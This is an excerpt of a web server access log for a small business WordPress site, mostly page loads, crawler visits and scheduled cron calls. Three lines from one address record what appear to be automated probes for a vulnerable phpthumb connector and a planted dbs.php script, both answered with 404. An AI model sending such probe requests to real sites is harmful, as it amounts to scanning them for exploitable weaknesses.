208.113.153.204 - - [25/Jul/2018:05:53:31 -0700] "POST /wp-cron.php?doing_wp_cron=1532523211.2289729118347167968750 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532523211.2289729118347167968750" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:05:53:30 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
192.243.55.95 - - [25/Jul/2018:05:54:09 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9009 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
66.249.64.13 - - [25/Jul/2018:05:56:58 -0700] "GET /PDF_XLS_MDB/9400iibroc.pdf HTTP/1.1" 301 542 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)" 
64.179.74.218 - - [25/Jul/2018:05:58:00 -0700] "GET / HTTP/1.1" 200 5767 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/themes/aablueprint-v1.3/style.css HTTP/1.1" 200 4471 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/nivo-slider.css?ver=4.9.7 HTTP/1.1" 200 1127 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.0.3 HTTP/1.1" 200 987 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/jquery.nivo.slider.pack.js?ver=4.9.7 HTTP/1.1" 200 3437 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/supercarousel/css/prettyPhoto.css?ver=4.9.7 HTTP/1.1" 200 3151 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/supercarousel/css/supercarousel.css?ver=4.9.7 HTTP/1.1" 200 1214 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/jetpack/modules/widgets/social-icons/social-icons.css?ver=20170506 HTTP/1.1" 200 877 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/jetpack/css/jetpack.css?ver=6.3.2 HTTP/1.1" 200 12708 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-includes/css/dashicons.min.css?ver=4.9.7 HTTP/1.1" 200 29328 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-includes/js/jquery/jquery.js?ver=1.12.4 HTTP/1.1" 200 34658 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 4375 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.imagesloaded.min.js?ver=4.9.7 HTTP/1.1" 200 926 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.supercarousel.min.js?ver=4.9.7 HTTP/1.1" 200 2601 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:02 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.ismouseover.js?ver=4.9.7 HTTP/1.1" 200 714 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.easing.min.js?ver=4.9.7 HTTP/1.1" 200 2189 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.easing.compatibility.js?ver=4.9.7 HTTP/1.1" 200 727 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.mousewheel.js?ver=4.9.7 HTTP/1.1" 200 1280 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.touchSwipe.min.js?ver=4.9.7 HTTP/1.1" 200 2221 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.prettyPhoto.js?ver=4.9.7 HTTP/1.1" 200 6387 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.watch.js?ver=4.9.7 HTTP/1.1" 200 1627 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/bar/bar.css?ver=4.9.7 HTTP/1.1" 200 1423 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/dark/dark.css?ver=4.9.7 HTTP/1.1" 200 1062 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/default/default.css?ver=4.9.7 HTTP/1.1" 200 1038 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/light/light.css?ver=4.9.7 HTTP/1.1" 200 1056 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.0.3 HTTP/1.1" 200 4449 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.9.7 HTTP/1.1" 200 817 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-includes/js/wp-embed.min.js?ver=4.9.7 HTTP/1.1" 200 1079 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/reset.css HTTP/1.1" 200 909 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/base.css HTTP/1.1" 200 495 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/core.css HTTP/1.1" 200 706 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/layout.css HTTP/1.1" 200 2767 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/uploads/2014/04/home-slide-3_1.jpg HTTP/1.1" 200 84047 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/uploads/2014/03/home-slide-5.jpg HTTP/1.1" 200 83953 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:05 -0700] "GET /wp-includes/js/wp-emoji-release.min.js?ver=4.9.7 HTTP/1.1" 200 4595 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/uploads/2014/03/home-slide-4.jpg HTTP/1.1" 200 92688 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/uploads/2018/07/50th_slide.png HTTP/1.1" 200 231905 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
208.113.153.204 - - [25/Jul/2018:05:58:01 -0700] "POST /wp-cron.php?doing_wp_cron=1532523481.0112519264221191406250 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532523481.0112519264221191406250" "WordPress/4.9.7; http://www.aablueprint.com" 
64.179.74.218 - - [25/Jul/2018:05:58:06 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_repromax.jpg HTTP/1.1" 200 2122 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/uploads/2018/07/HPPWXL8000.jpg HTTP/1.1" 200 322721 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:07 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_canon.jpg HTTP/1.1" 200 2015 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:07 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_hp.jpg HTTP/1.1" 200 1853 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:08 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_edge.jpg HTTP/1.1" 200 2756 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:08 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/icon_facebook.jpg HTTP/1.1" 200 3491 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:09 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_epson.jpg HTTP/1.1" 200 2077 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:09 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo-aa_blueprint.gif HTTP/1.1" 200 4760 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/css/layout.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:09 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/photo-print-services.jpg HTTP/1.1" 200 13413 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:09 -0700] "GET /wp-content/uploads/2014/04/home-slide-2d.jpg HTTP/1.1" 200 155112 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:09 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/arrow-right-white.png HTTP/1.1" 200 450 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:10 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/photo-equipment-sales.jpg HTTP/1.1" 200 11244 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:10 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/arrow-down-white.png HTTP/1.1" 200 832 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.179.74.218 - - [25/Jul/2018:05:58:10 -0700] "GET /wp-content/themes/aablueprint-v1.3/favicon.ico HTTP/1.1" 200 11641 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
104.154.198.228 - - [25/Jul/2018:05:58:15 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
64.179.74.218 - - [25/Jul/2018:05:58:03 -0700] "GET /wp-content/uploads/2014/05/AABlueprint_Slider_Wraps_Layout.png HTTP/1.1" 200 410002 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
187.123.83.99 - - [25/Jul/2018:06:03:06 -0700] "GET /wp-content/uploads/2014/12/iPF785.jpg HTTP/1.1" 200 607360 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
104.154.198.228 - - [25/Jul/2018:06:05:00 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9067 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:06:05:01 -0700] "POST /wp-cron.php?doing_wp_cron=1532523901.4136030673980712890625 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532523901.4136030673980712890625" "WordPress/4.9.7; http://www.aablueprint.com" 
141.8.144.2 - - [25/Jul/2018:06:05:08 -0700] "GET /robots.txt HTTP/1.1" 200 609 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
141.8.144.2 - - [25/Jul/2018:06:05:11 -0700] "GET /supplies-repair HTTP/1.1" 301 569 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.91.120 - - [25/Jul/2018:06:05:15 -0700] "GET /supplies-repair/ HTTP/1.1" 200 5401 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
5.255.250.5 - - [25/Jul/2018:06:05:21 -0700] "GET /robots.txt HTTP/1.1" 200 615 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
40.77.167.140 - - [25/Jul/2018:06:08:52 -0700] "GET /wp-content/uploads/2014/02/mounting-bottom-left.jpg HTTP/1.1" 200 59357 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.154.198.228 - - [25/Jul/2018:06:10:50 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:06:10:51 -0700] "POST /wp-cron.php?doing_wp_cron=1532524250.7625010013580322265625 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532524250.7625010013580322265625" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:06:16:23 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:06:16:24 -0700] "POST /wp-cron.php?doing_wp_cron=1532524584.4139900207519531250000 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532524584.4139900207519531250000" "WordPress/4.9.7; http://www.aablueprint.com" 
66.249.64.13 - - [25/Jul/2018:06:17:21 -0700] "GET /robots.txt HTTP/1.1" 301 508 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.12 - - [25/Jul/2018:06:17:21 -0700] "GET / HTTP/1.1" 301 489 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.12 - - [25/Jul/2018:06:17:21 -0700] "GET /robots.txt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.14 - - [25/Jul/2018:06:17:23 -0700] "GET /robots.txt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
208.113.153.204 - - [25/Jul/2018:06:17:21 -0700] "POST /wp-cron.php?doing_wp_cron=1532524641.8965840339660644531250 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532524641.8965840339660644531250" "WordPress/4.9.7; http://www.aablueprint.com" 
66.249.70.14 - - [25/Jul/2018:06:17:22 -0700] "GET / HTTP/1.1" 200 5767 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
192.243.55.95 - - [25/Jul/2018:06:20:52 -0700] "GET /supplies-repair/feed/ HTTP/1.1" 200 1468 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
157.55.39.211 - - [25/Jul/2018:06:21:02 -0700] "GET /wp-content/uploads/2014/03/home-slide-5.jpg HTTP/1.1" 200 83954 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
192.243.55.95 - - [25/Jul/2018:06:21:03 -0700] "GET /supplies-repair/feed/ HTTP/1.1" 200 1468 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
104.154.198.228 - - [25/Jul/2018:06:21:10 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
104.154.198.228 - - [25/Jul/2018:06:26:57 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:06:26:58 -0700] "POST /wp-cron.php?doing_wp_cron=1532525218.2468729019165039062500 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532525218.2468729019165039062500" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:06:31:12 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:06:31:12 -0700] "POST /wp-cron.php?doing_wp_cron=1532525472.7210760116577148437500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532525472.7210760116577148437500" "WordPress/4.9.7; http://www.aablueprint.com" 
208.113.153.204 - - [25/Jul/2018:06:34:00 -0700] "POST /wp-cron.php?doing_wp_cron=1532525640.2873499393463134765625 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532525640.2873499393463134765625" "WordPress/4.9.7; http://www.aablueprint.com" 
178.137.93.108 - - [25/Jul/2018:06:33:59 -0700] "GET / HTTP/1.1" 200 23040 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
178.137.93.108 - - [25/Jul/2018:06:34:01 -0700] "POST /connectors/system/phpthumb.php HTTP/1.1" 404 17848 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
178.137.93.108 - - [25/Jul/2018:06:34:02 -0700] "GET /dbs.php HTTP/1.1" 404 17825 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
104.154.198.228 - - [25/Jul/2018:06:36:17 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
65.25.116.132 - - [25/Jul/2018:06:38:49 -0700] "GET /wp-content/uploads/2014/05/AABlueprint_Slider_Wraps_Layout.png HTTP/1.1" 200 410003 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
208.113.153.204 - - [25/Jul/2018:06:38:54 -0700] "POST /wp-cron.php?doing_wp_cron=1532525934.5772719383239746093750 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532525934.5772719383239746093750" "WordPress/4.9.7; http://www.aablueprint.com" 
65.25.116.132 - - [25/Jul/2018:06:38:53 -0700] "GET / HTTP/1.1" 200 5767 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/themes/aablueprint-v1.3/style.css HTTP/1.1" 200 4470 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/nivo-slider.css?ver=4.9.7 HTTP/1.1" 200 1127 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.0.3 HTTP/1.1" 200 987 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/css/supercarousel.css?ver=4.9.7 HTTP/1.1" 200 1213 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/css/prettyPhoto.css?ver=4.9.7 HTTP/1.1" 200 3151 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/jetpack/modules/widgets/social-icons/social-icons.css?ver=20170506 HTTP/1.1" 200 878 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/jetpack/css/jetpack.css?ver=6.3.2 HTTP/1.1" 200 12708 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/bar/bar.css?ver=4.9.7 HTTP/1.1" 200 1423 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/dark/dark.css?ver=4.9.7 HTTP/1.1" 200 1062 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/default/default.css?ver=4.9.7 HTTP/1.1" 200 1038 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/light/light.css?ver=4.9.7 HTTP/1.1" 200 1056 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/reset.css HTTP/1.1" 200 909 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
